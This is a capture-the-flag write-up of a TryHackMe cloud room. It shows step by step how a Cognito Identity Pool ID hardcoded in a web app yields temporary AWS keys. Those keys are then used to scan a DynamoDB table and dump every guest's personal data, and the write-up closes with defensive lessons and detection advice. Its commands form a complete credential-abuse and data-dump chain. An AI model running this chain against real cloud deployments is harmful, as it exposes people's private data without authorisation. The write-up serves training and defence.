@@ -1,0 +1,105 @@
+# Room Name - TryHackMe: Complimentary
+Date: 29 July 2026
+Difficulty: Easy
+Category: Cloud Security / AWS / Broken Access Control / IDOR
+
+# Scenario
+Install the free app and it hands your phone a set of cloud keys, the same set it hands everyone. They are read-only, but read-only of every guest's contacts, location, and passwords, not just your own. The challenge involved reverse engineering a client-side web app to find hardcoded AWS Cognito credentials, using those credentials to obtain temporary AWS keys, and exploiting an overly permissive IAM role to dump all guest records from a DynamoDB table.
+
+# Tools Used
+- TryHackMe Attack Box
+- Terminal (bash)
+- curl
+- AWS CLI
+- jq
+- grep
+
+# What I Did
+
+Step 1 — Download and inspect the app's source
+- Accessed the target S3-hosted web app and downloaded the HTML source:
+```
+curl -s http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/ -o index.html
+cat index.html
+```
+- Found the app loaded two JavaScript files: the AWS SDK and app.js.
+- Downloaded app.js separately and searched for AWS configuration references.
+
+Step 2 — Extract the Cognito Identity Pool ID
+- Identified the AWS Cognito Identity Pool ID embedded in app.js used to issue unauthenticated guest credentials:
+```
+us-east-1:836c0949-292d-485b-b532-52d5ca7bb688
+```
+
+Step 3 — Obtain a Cognito Identity ID
+- Used the AWS CLI to request an anonymous Cognito identity using the exposed pool ID:
+```
+aws cognito-identity get-id \
+  --identity-pool-id us-east-1:836c0949-292d-485b-b532-52d5ca7bb688 \
+  --region us-east-1
+```
+- Received Identity ID: us-east-1:4d571309-b012-c7c0-e39d-ff95df0c8a6f
+
+Step 4 — Exchange the Identity ID for temporary AWS credentials
+- Called get-credentials-for-identity to obtain temporary access keys:
+```
+aws cognito-identity get-credentials-for-identity \
+  --identity-id us-east-1:4d571309-b012-c7c0-e39d-ff95df0c8a6f \
+  --region us-east-1 > creds.json
+```
+- Received a full set of temporary AWS credentials including AccessKeyId, SecretKey, and SessionToken.
+
+Step 5 — Configure the AWS CLI with the obtained credentials
+- Exported the credentials as environment variables using jq to parse the JSON:
+```
+export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' creds.json)
+export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretKey' creds.json)
+export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' creds.json)
+export AWS_DEFAULT_REGION="us-east-1"
+```
+- Verified the assumed identity:
+```
+aws sts get-caller-identity
+```
+- Confirmed the role: complimentary-cognito-unauth-role (unauthenticated guest role)
+
+Step 6 — Scan the DynamoDB table for all guest records
+- Used the credentials to perform a full table scan against the guest wellness profiles table:
+```
+aws dynamodb scan \
+  --table-name complimentary-GuestWellnessProfiles \
+  --region us-east-1 \
+  --output json | jq '.Items'
+```
+- Retrieved all 5 guest records including names, emails, phone numbers, locations, passwords, and notes.
+- Found the flag embedded in the notes field of guest-vip-042:
+```
+"If you're reading this, the wellness app's guest role can read every profile, not just its own. THM{fr33_app_fr33_d4t4!}"
+```
+
+Step 7 — Extract the flag directly with grep
+- Confirmed the flag using a targeted grep against the scan output:
+```
+aws dynamodb scan --table-name complimentary-GuestWellnessProfiles --region us-east-1 | grep -o "THM{[^}]*}"
+```
+
+# What I Found
+- AWS Cognito Identity Pool ID: us-east-1:836c0949-292d-485b-b532-52d5ca7bb688
+- Cognito Identity ID obtained: us-east-1:4d571309-b012-c7c0-e39d-ff95df0c8a6f
+- IAM role assumed: complimentary-cognito-unauth-role
+- DynamoDB table: complimentary-GuestWellnessProfiles
+- Total guest records exposed: 5
+- Data exposed per record: name, email, phone, location, password, notes
+- Flag found in: guest-vip-042 notes field
+- Flag: THM{fr33_app_fr33_d4t4!}
+
+# Key Learning
+Hardcoding an AWS Cognito Identity Pool ID in client-side JavaScript is intentional by design for unauthenticated access but becomes a critical vulnerability when the associated IAM role is granted overly permissive DynamoDB access. The unauthenticated role should only have permission to read the calling user's own record, enforced through IAM conditions on the identity ID. Instead, the role was granted a blanket DynamoDB Scan permission, allowing any anonymous user to dump the entire table. This is a textbook broken access control vulnerability where authentication is absent and authorisation is not scoped to the requesting identity.
+
+# What I Would Flag in a Real SOC
+- AWS Cognito unauthenticated roles must follow the principle of least privilege, a guest role should never have DynamoDB Scan or Query permissions without a condition restricting access to the caller's own partition key
+- Plaintext passwords stored in a DynamoDB table are a critical data protection failure, passwords must be hashed using a strong algorithm such as bcrypt before storage, never stored as raw strings
+- A DynamoDB table containing PII including names, emails, phone numbers, and GPS coordinates with no row-level access control represents a mass data exposure risk violating GDPR and similar data protection regulations
+- Client-side JavaScript embedding AWS resource identifiers should be reviewed in every web application security assessment, any identifier that allows unauthenticated credential issuance is an immediate finding
+- CloudTrail logging should be enabled on all DynamoDB tables to detect full table scans from unauthenticated Cognito identities, a scan of an entire guest table by a guest role is an anomalous access pattern that should alert immediately
+- Temporary credentials obtained via Cognito unauthenticated flows should be monitored for unusual API calls, get-credentials-for-identity followed immediately by dynamodb:Scan is a reconnaissance pattern consistent with cloud privilege abuse
